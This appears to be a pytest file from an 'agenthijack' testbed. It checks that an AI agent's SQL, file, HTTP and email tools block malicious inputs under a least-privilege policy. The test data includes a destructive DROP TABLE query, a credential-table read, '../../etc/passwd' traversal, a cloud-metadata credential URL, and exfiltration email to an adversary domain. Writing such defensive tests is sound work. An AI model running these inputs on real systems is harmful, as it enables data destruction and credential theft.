from agenthijack.models import SecurityPolicyMode
from agenthijack.tools.email_tool import EmailDispatchTool
from agenthijack.tools.file_tool import FileSystemTool
from agenthijack.tools.http_tool import HttpFetchTool
from agenthijack.tools.sql_tool import SqlQueryTool


def test_sql_tool_select_valid():
    tool = SqlQueryTool()
    res = tool.execute(
        {"query": "SELECT name, salary FROM employees WHERE id = 1"},
        policy_mode=SecurityPolicyMode.STRICT_LEAST_PRIVILEGE,
    )
    assert res.success is True
    assert res.blocked_by_policy is False
    assert res.output["count"] == 1
    assert res.output["rows"][0][0] == "Alice"


def test_sql_tool_blocks_destructive_in_strict_mode():
    tool = SqlQueryTool()
    res = tool.execute(
        {"query": "DROP TABLE employees;"},
        policy_mode=SecurityPolicyMode.STRICT_LEAST_PRIVILEGE,
    )
    assert res.success is False
    assert res.blocked_by_policy is True
    assert "Destructive" in (res.error or "")


def test_sql_tool_blocks_sensitive_table_in_strict_mode():
    tool = SqlQueryTool()
    res = tool.execute(
        {"query": "SELECT * FROM system_credentials"},
        policy_mode=SecurityPolicyMode.STRICT_LEAST_PRIVILEGE,
    )
    assert res.success is False
    assert res.blocked_by_policy is True
    assert "system_credentials" in (res.error or "")


def test_file_tool_read_valid():
    tool = FileSystemTool()
    res = tool.execute(
        {"path": "public/faq.txt"},
        policy_mode=SecurityPolicyMode.STRICT_LEAST_PRIVILEGE,
    )
    assert res.success is True
    assert "Customer support" in res.output["content"]


def test_file_tool_blocks_path_traversal():
    tool = FileSystemTool()
    res = tool.execute(
        {"path": "../../etc/passwd"},
        policy_mode=SecurityPolicyMode.STRICT_LEAST_PRIVILEGE,
    )
    assert res.success is False
    assert res.blocked_by_policy is True
    assert "traversal" in (res.error or "").lower()


def test_http_tool_blocks_cloud_metadata():
    tool = HttpFetchTool()
    res = tool.execute(
        {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
        policy_mode=SecurityPolicyMode.STRICT_LEAST_PRIVILEGE,
    )
    assert res.success is False
    assert res.blocked_by_policy is True


def test_http_tool_blocks_localhost():
    tool = HttpFetchTool()
    res = tool.execute(
        {"url": "https://localhost:8080/admin"},
        policy_mode=SecurityPolicyMode.STRICT_LEAST_PRIVILEGE,
    )
    assert res.success is False
    assert res.blocked_by_policy is True


def test_email_tool_valid_recipient():
    tool = EmailDispatchTool()
    res = tool.execute(
        {
            "recipient": "operations@company.internal",
            "subject": "Status Update",
            "body": "System functioning smoothly.",
        },
        policy_mode=SecurityPolicyMode.STRICT_LEAST_PRIVILEGE,
    )
    assert res.success is True
    assert res.output["status"] == "sent"


def test_email_tool_blocks_unauthorized_domain():
    tool = EmailDispatchTool()
    res = tool.execute(
        {
            "recipient": "hacker@adversary-exfil.org",
            "subject": "Stolen",
            "body": "Payload",
        },
        policy_mode=SecurityPolicyMode.STRICT_LEAST_PRIVILEGE,
    )
    assert res.success is False
    assert res.blocked_by_policy is True
    assert "Unauthorized external recipient domain" in (res.error or "")


def test_email_tool_blocks_credential_in_body():
    tool = EmailDispatchTool()
    res = tool.execute(
        {
            "recipient": "dev@company.internal",
            "subject": "Key",
            "body": "Leaked key: AKIAIOSFODNN7EXAMPLE",
        },
        policy_mode=SecurityPolicyMode.STRICT_LEAST_PRIVILEGE,
    )
    assert res.success is False
    assert res.blocked_by_policy is True
    assert "credential" in (res.error or "").lower()
